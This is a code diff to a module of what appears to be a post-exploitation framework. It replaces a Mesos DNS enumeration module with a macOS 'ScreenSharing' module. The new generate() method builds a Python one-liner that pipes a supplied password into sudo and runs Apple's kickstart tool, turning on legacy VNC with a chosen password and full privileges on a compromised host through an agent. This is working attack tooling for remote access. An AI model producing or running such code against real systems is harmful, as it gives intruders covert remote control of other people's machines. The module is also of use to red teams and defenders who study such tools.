@@ -1,5 +1,6 @@
 from lib.common import helpers
 
+
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -7,19 +8,19 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'Mesos DNS API Enumeration',
+            'Name': 'ScreenSharing',
 
             # list of one or more authors for the module
-            'Author': ['@TweekFawkes'],
+            'Author': ['@n00py'],
 
             # more verbose multi-line description of the module
-            'Description': ('Enumerate Mesos DNS information using the HTTP API for the Mesos DNS service'),
+            'Description': ('Enables ScreenSharing to allow you to connect to the host via VNC.'),
 
             # True if the module needs to run in the background
             'Background' : False,
 
             # File extension to save the file as
-            'OutputExtension': "json",
+            'OutputExtension' : "",
 
             # if the module needs administrative privileges
             'NeedsAdmin' : False,
@@ -34,7 +35,7 @@ class Module:
             'MinLanguageVersion' : '2.6',
 
             # list of any references/other comments
-            'Comments': ["Docs: https://mesosphere.github.io/mesos-dns/docs/http.html", "Source Code: https://github.com/mesosphere/mesos-dns/blob/master/resolver/resolver.go"]
+            'Comments': ['https://www.unix-ninja.com/p/Enabling_macOS_screen_sharing_VNC_via_command_line']
         }
 
         # any options needed by the module, settable during runtime
@@ -42,22 +43,19 @@ class Module:
             # format:
             #   value_name : {description, required, default_value}
             'Agent' : {
-                # The 'Agent' option is the only one that MUST be in a module
                 'Description'   :   'Agent to execute module on.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'Target' : {
-                # The 'Agent' option is the only one that MUST be in a module
-                'Description'   :   'FQDN, domain name, or hostname to lookup on the remote target.',
+            'Password' : {
+                'Description'   :   'User password for sudo.',
                 'Required'      :   True,
-                'Value'         :   'master.mesos'
+                'Value'         :   ''
             },
-            'Port' : {
-                # The 'Agent' option is the only one that MUST be in a module
-                'Description'   :   'The port to scan for.',
+            'VNCpass' : {
+                'Description'   :   'Password to use for VNC',
                 'Required'      :   True,
-                'Value'         :   '8123'
+                'Value'         :   ''
             }
         }
 
@@ -76,31 +74,13 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-
     def generate(self):
-        target = self.options['Target']['Value']
-        port = self.options['Port']['Value']
-        
 
-        script = """
-import urllib2
 
-target = "%s"
-port = "%s"
 
-url = "http://" + target + ":" + port + "/v1/enumerate"
+        password = self.options['Password']['Value']
+        vncpass = self.options['VNCpass']['Value']
 
-try:
-    request = urllib2.Request(url)
-    request.add_header('User-Agent',
-                   'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) '
-                   'Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0')
-    opener = urllib2.build_opener(urllib2.HTTPHandler)
-    content = opener.open(request).read()
-    print str(content)
-except Exception as e:
-    print "Failure sending payload: " + str(e)
-
-""" %(target, port)
-
+        enable = "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw %s -restart -agent -privs -all"  % (vncpass)
+        script = 'import subprocess; subprocess.Popen("echo \\"%s\\" | sudo -S %s", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)' % (password, enable)
         return script
